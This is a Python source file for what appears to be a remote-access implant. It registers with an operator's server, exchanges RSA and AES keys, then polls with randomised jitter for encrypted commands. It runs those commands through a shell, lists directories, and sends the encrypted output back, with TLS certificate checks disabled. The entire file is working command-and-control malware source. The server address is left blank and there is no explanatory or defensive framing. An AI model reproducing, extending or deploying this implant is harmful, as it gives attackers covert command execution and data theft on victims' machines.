import urllib.request
import random
from time import sleep
import subprocess
import ssl
import urllib.parse
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
import base64
import hashlib
from Crypto import Random
from os import listdir

host = "" # Address of the host running server.py
port = "" # Listening port of server.py
register_dir = ""
command_dir = "command"
response_dir = "response"

CON_FAIL_LIMIT = 5
CONN_FAIL_RETRY_TIME = 10

base_url = f"https://{host}:{port}"
ssl_ctx = ssl.create_default_context()
ssl_ctx.check_hostname = False
ssl_ctx.verify_mode = ssl.CERT_NONE

class AESCipher(object):
    """
    A classical AES Cipher. Can use any size of data and any size of password thanks to padding.
    Also ensure the coherence and the type of the data with a unicode to byte converter.
    """
    def __init__(self, key):
        self.bs = 16
        self.key = hashlib.sha256(AESCipher.str_to_bytes(key)).digest()

    @staticmethod
    def str_to_bytes(data):
        u_type = type(b''.decode('utf8'))
        if isinstance(data, u_type):
            return data.encode('utf8')
        return data

    def _pad(self, s):
        return s + (self.bs - len(s) % self.bs) * AESCipher.str_to_bytes(chr(self.bs - len(s) % self.bs))

    @staticmethod
    def _unpad(s):
        return s[:-ord(s[len(s)-1:])]

    def encrypt(self, raw):
        raw = self._pad(AESCipher.str_to_bytes(raw))
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return base64.b64encode(iv + cipher.encrypt(raw)).decode('utf-8')

    def decrypt(self, enc):
        enc = base64.b64decode(enc)
        iv = enc[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')

def generate_keys():
    key = RSA.generate(2048)
    private_key = key.export_key()
    public_key = key.publickey().export_key()
    return public_key, private_key


def decrypt(enc_data, private_key):
    private_key = RSA.import_key(private_key)

    enc_session_key = enc_data[:private_key.size_in_bytes()]
    nonce = enc_data[private_key.size_in_bytes():private_key.size_in_bytes() + 16]
    tag = enc_data[private_key.size_in_bytes() + 16:private_key.size_in_bytes() + 32]
    ciphertext = enc_data[private_key.size_in_bytes() + 32:]
    cipher_rsa = PKCS1_OAEP.new(private_key)
    session_key = cipher_rsa.decrypt(enc_session_key)
    cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)
    data = cipher_aes.decrypt_and_verify(ciphertext, tag)
    return data.decode("utf-8")

def extract_id_and_key(data, private_key):
    data = base64.b64decode(data)
    data = decrypt(data, private_key)
    id = data[:16]
    key = data[16:]
    return id, key

if __name__ == "__main__":
    pub, priv = generate_keys()
    print(pub)
    pub = base64.b64encode(pub).decode('utf-8')
    register_url = base_url + f"/{register_dir}?key={pub}&auth=testauth"
    try:
        request = urllib.request.urlopen(register_url, context=ssl_ctx)
    except:
        exit(-1)
    request = request.read().decode('utf-8')
    id, key = extract_id_and_key(request, priv)

    cipher = AESCipher(key)
    command = None
    jlo = 1
    jhi = 10
    conn_fail_count = 0
    while command != "exit":
        command_url = base_url + f"/{command_dir}?id={id}"
        response_url = base_url + f"/{response_dir}?id={id}"
        #print(f"Waiting {jitter} seconds...")
        jitter = random.randint(jlo, jhi)
        try:
            request = urllib.request.urlopen(command_url+f"&jit={jitter}", context=ssl_ctx)
            conn_fail_count = 0
        except urllib.error.URLError:
            conn_fail_count += 1
            print("Failed to connect to server ...")
            print(f"Fail number {conn_fail_count}")
            if conn_fail_count == CON_FAIL_LIMIT:
                print("Max connection failures reached, exiting")
                exit(-1)
            sleep(CONN_FAIL_RETRY_TIME)
            continue
        commands = request.read().decode('utf-8')
        if commands != "":
            commands = cipher.decrypt(commands)
            commands = commands.split("////")
            replys = []
            for command in commands:
                if "::::" in command:
                    command = command[4:]
                    command = command.split()
                    if command[0] == "adj_jitter":
                        jlo = int(command[1])
                        jhi = int(command[2])
                    if command[0] == "listdir":
                        directory = command[1]
                        try:
                            directory_contents = listdir(directory)
                        except:
                            directory_contents = "Failed"
                        directory_contents = "\r\n".join(directory_contents)
                        reply = f"{command}////{directory_contents}"
                        reply = cipher.encrypt(reply).encode('utf-8')
                        response_url += f"&response={urllib.parse.quote(reply)}"
                        urllib.request.urlopen(response_url, context=ssl_ctx)

                else:
                    proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    stdout_value = proc.communicate()[0].decode('utf-8')
                    stdout_value = stdout_value.rstrip()
                    reply = f"{command}////{stdout_value}"

                    reply = cipher.encrypt(reply).encode('utf-8')
                    response_url += f"&response={urllib.parse.quote(reply)}"
                    urllib.request.urlopen(response_url, context=ssl_ctx)
        sleep(jitter)



